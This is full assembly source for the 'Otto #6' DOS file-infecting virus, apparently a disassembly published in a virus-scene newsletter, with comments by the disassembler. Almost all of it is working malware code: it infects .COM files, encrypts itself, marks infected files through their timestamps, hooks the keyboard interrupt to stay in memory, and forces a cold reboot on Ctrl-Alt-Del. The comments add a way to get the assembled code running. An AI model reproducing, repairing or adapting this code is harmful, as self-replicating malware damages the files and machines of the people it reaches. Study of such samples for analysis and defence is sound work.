; Otto #6 Virus, By Youth Against McAfee
; Disassembly By The Attitude Adjuster of Virulent Graffiti for
; Infectious Diseases 3 and some other uses...

; Assemble with: TASM /m2 otto5.asm  for a byte for byte matchup
;                TLINK /t otto5.obj        
        
; The assembled code will NOT execute... a big thanks to YAM for that one! The
; only workaround I got is to trace thru til the mov [00FFh], al, and just
; move the ip ahead to startencrypt!

.model tiny
.code
        org     100h
start:
        db      0e9h, 02, 00                            ; jmp near virusentry

        nop                                             ; they had to be here
        nop                                             ; in the original

virusentry:
        call    getdelta                                ; get delta ofs
getdelta:  
        pop     si
        push    si
        
        sub     si,offset getdelta                      ; sub original ofs
        
        pop     ax                                      ; delta in ax
        sub     ax,100h
        
        mov     ds:[00FFh],al                           ; ds:00FFh == al
        push    si                                      ; save delta
        
        mov     cx,260h                                 ; ieterations
        add     si,offset startencrypt
cryptloop:
        xor     [si],al                                 ; xor
        inc     si
        rol     al,1                                    ; rotate
        loop    cryptloop                               ; loop if cx > 0
        pop     si                                      ; delta in si
        
startencrypt:
        mov     ax,word ptr ds:[first3+si]              ; restore first
        mov     dh,byte ptr ds:[first3+si+2]            ; 3 bytes
        mov     word ptr ds:[100h],ax
        mov     byte ptr ds:[102h],dh

        lea     dx,[si+file]                            ; find *.COM
        xor     cx,cx
        mov     ah,4Eh
findfirstnext:  
        int     21h
        
        jnc     checkinfected                           ; carry?
        jmp     takeithome                              ; no more files

checkinfected:                                          ; check file
        mov     dx,offset 9Eh                           ; filename in default
        mov     ax,3D02h                                ;   dta
        int     21h                                     ; open file r/w
        
        mov     bx,ax                                   ; handle in BX
        
        mov     ax,5700h                                ; get file date
        int     21h
        
        cmp     cl,3                                    ; cl = 3?
        jne     infectitthen                            ; nope
        
        mov     ah,3Eh                                  ; infected, close
        int     21h
        
        mov     ah,4Fh                                  ; find next *.COM
        jmp     short findfirstnext                     ; again

infectitthen:                                           ; infect the file
        push    cx                                      ; push time
        push    dx                                      ; push date
        call    lseekstart                              ; lseek beginning
        
        lea     dx,[si+first3]                          ; buffer at first3
        mov     cx,3                                    ; read 3 bytes
        mov     ah,3Fh
        int     21h
        
        xor     cx,cx                                   ; lseek the end
        xor     dx,dx                                   ; fileside DX:AX
        mov     ax,4202h
        int     21h
                                                        ; 4D1h
        mov     word ptr ds:[fsize+si],ax               ; save fsize
        sub     ax,3                                    ; calculate jump
        mov     word ptr ds:[fsize2+si],ax
        call    lseekstart
        add     ax,6                                    ; fsize+3
        
        mov     byte ptr ds:[lob+si],al                 ; lob of fsize+3
        mov     cx,word ptr ds:[fsize+si]               ; size of file
        lea     dx,[si+heap]                            ; point at buffer
        mov     ah,3Fh
        int     21h                                     ; read

        push    si                                      ; push delta
        mov     al,byte ptr ds:[lob+si]                 ; lod of fsize+3
        add     si,offset ds:[heap+3]                   ; point at code
        call    encrypt                                 ; encrypt original
        pop     si                                      ; pop delta
        call    lseekstart                              ; lseek beginning
        
        mov     cx,word ptr ds:[fsize+si]               ; fsize
        lea     dx,[si+heap]                            ; buffer at heap
        mov     ah,40h                                  ; write file
        int     21h
        
        jnc     finishinfect                            ; error (attributes)
        jmp     short takeithome                        ; yes
finishinfect:
        lea     dx,[si+virusentry]                      ; write encrypter
        mov     cx,startencrypt-virusentry              ; to file
        mov     ah,40h
        int     21h
        
        push    si                                      ; push delta
        mov     cx,heap-startencrypt                    ; virus length-crypt
        ; mov     di,si                                 ; delta in di
        db      89h, 0F7h                               ; alternate encoding
        add     di,offset ds:[heap]                     ; point at heap
        add     si,offset ds:[startencrypt]             ; point at virus
        rep     movsb                                   ; copy code to heap
        pop     si                                      ; pop delta
        
        push    si                                      ; push delta
        mov     al,byte ptr ds:[lob+si]                 ; lob of fsize+3
        mov     cx,heap-startencrypt                    ; virus length
        add     si,offset ds:[heap]                     ; buffer at heap
        call    encrypt                                 ; encrypt heap
        pop     si                                      ; pop delta
        
        mov     cx,heap-startencrypt                    ; virus length
        lea     dx,[si+heap]                            ; buffer at heap
        mov     ah,40h                                  ; write virus
        int     21h
        jc      takeithome                              ; error?
        
        call    lseekstart
        
        lea     dx,[si+jump]                            ; buffer at jump
        mov     ah,40h                                  ; write jump
        mov     cx,3
        int     21h
        jc      takeithome                              ; error?
        
        pop     dx                                      ; pop date
        pop     cx                                      ; pop time
        mov     cl,3                                    ; set infected flag
        mov     ax,5701h                                ; set time
        int     21h
        
        mov     ah,3Eh                                  ; close file
        int     21h

takeithome:
        push    si                                      ; push delta
        mov     al, byte ptr ds:[00FFh]                 ; saved xor byte
        xor     cx,cx
        ; add     cx,si                                 ; the pricks use 
        db      01, 0f1h                                ; alternate encoding
        add     cx,3                                    ; ieterations in cx
        mov     bp,103h
        mov     si,bp                                   ; unencrypt old code
        call    encrypt
        pop     si                                      ; pop delta
        
        mov     bp,100h                                 ; where to RET to
        
        mov     ax,0B0Bh                                ; RuThereCall
        int     9
        
        cmp     ax,0BEEFh                               ; if beefy, it's
        je      skipinstall                             ; installed
        
        xor     ax, ax
        mov     ds, ax                                  ; interrupt table
        lds     bx, dword ptr ds:[9*4]                  ; Int 9 -> DS:BX
        
        push    bp                                      ; push ret addr
        mov     bp,offset ds:[old9]                     ; JMP FAR PTR
        mov     cs:[bp+si+1],bx                         ; offset
        mov     cs:[bp+si+3],ds                         ; segment
        pop     bp                                      ; pop ret addr
        
        mov     bx,es
        dec     bx                                      ; our MCB paragraph
        mov     ds,bx
        sub     word ptr ds:[0003],80h                  ; allow for us to get
                                                        ; some memory
        mov     ax, word ptr ds:[0012h]                 ; 1st unused segment
        sub     ax,80h
        mov     word ptr ds:[0012h],ax                  ; replace valu
        
        mov     es,ax                                   ; es = our new seg
        push    cs                                      ; ds = cs
        pop     ds
        xor     di,di                                   ; es:0000 = dest.
        ; mov     bx,si                                 ; more alternate
        db      89h, 0f3h                               ; encoding!!
        lea     si,[bx+our9]                            ; buffer at our9
        mov     cx,200                                  ; more than enough
        rep     movsb                                   ; copy 200 bytes
        
        mov     ds,cx                                   ; cx = 0000
        mov     word ptr ds:[9*4],0                     ; offset (int 9)
        mov     word ptr ds:[9*4+2],es                  ; segment (int 9)
skipinstall:  
        push    cs                                      ; restore segments
        push    cs
        pop     ds
        pop     es
        push    bp                                      ; return to 100h
        ret
  
encrypt:                                                ; encrypt
        xor     [si],al                                 ; xor
        inc     si
        rol     al,1                                    ; rotate left
        loop    encrypt                                 ; Loop if cx > 0
        ret
  
        db      'OTTO6 VIRUS, <<',0E9h,53h,'>>, YAM, '
        db      'COPYRIGHT MICROSHAFT INDUSTRIES 1992 (tm.)'

lseekstart:        
        push    ax
        push    cx
        push    dx
        mov     ax, 4200h                               ; lseek beginning
        xor     cx,cx
        xor     dx,dx
        int     21h
        pop     dx
        pop     cx
        pop     ax
        ret

our9:                                                   ; our int9 handler        
        cmp     ax, 0B0Bh
        jnz     NotRuThere                              ; not an ruthere
        mov     ax, 0BEEFh
        IRet                                            ; int return
NotRuThere:
        push    ax                                      ; save registers
        push    bx        
        push    ds

        xor     ax,ax                                   ; BIOS segment
        mov     ds,ax
        in      al,60h                                  ; get keyboard input
        mov     bl, byte ptr ds:[0417h]                 ; get shift status
        test    bl,08                                   ; alt pressed?
        jz      removeregistersandleave                 ; no
        test    bl,04                                   ; ctrl pressed?
        jz      whyisthishere                           ; no
        cmp     al, 53h                                 ; delete?
        jnz     removeregistersandleave                 ; nope!
        and     bl,0F3h                                 ; mask off bits
        mov     byte ptr ds:[0417h],bl                  ; place in bios
        jmp     onwardbuttheads                         ; go on

whyisthishere:        
        cmp     al,4Ah                                  ; why is this here?
        jne     removeregistersandleave
removeregistersandleave:
        pop     ds                                      ; remove registers
        pop     bx
        pop     ax
        ; jmp     returntoold9                          ; more wierd 
        db      0e9h, 20h, 00                           ; encoding!

onwardbuttheads:
        push    cs                                      ; ds = cs
        pop     ds
        
        mov     ax,3                                    ; 80x25 text mode
        int     10h
        
        mov     ah,2                                    ; set cpos
        mov     bh,0
        mov     dx,0A14h                                ; 10,20
        int     10h
        
        mov     si,yamlogo-our9                         ; point to logo
pointlessloop:
        loop    pointlessloop
  
        lodsb                                           ; load string byte
        
        cmp     al,0                                    ; end of string?
        je      coldbootus                              ; yes
        
        mov     ah,0Eh                                  ; display char in al
        int     10h
        
        jmp     short pointlessloop

returntoold9:
old9    db      0EAh                                    ; JMP FAR PTR
        dd      00000000                                ; Int 9h
                
yamlogo db      '<<',0E9h,53h,'>>, YAM, MICROSHAFT INDUSTRIES (tm.) 1992!'
        db      '   ',0

coldbootus:
        mov     dx,28h
        mov     ds,dx                                   ; DS = 0028h
        mov     word ptr ds:[0072h],0                   ; DS:0072h=0
        
        ; the above does nothing, as the byte they are looking to modify is
        ; the warm-boot status byte, at 0040:0072h... duh...
        
        db      0EAh                                    ; JMP FAR PTR
        db      00h, 00h, 0FFh, 0FFh                    ; Cold Boot Vector
        
file    db      '*.COM',0                               ; search wildcard
        
first3  db      0CDh, 20h, 00h                          ; buffered 1st 3
        
jump    db      0E9h                                    ; jmp near
fsize2  db       50h, 01h

lob     db       56h                                    ; lob of fsize+3

fsize   db       53h, 01h                               ; filesize

heap:
        end     start
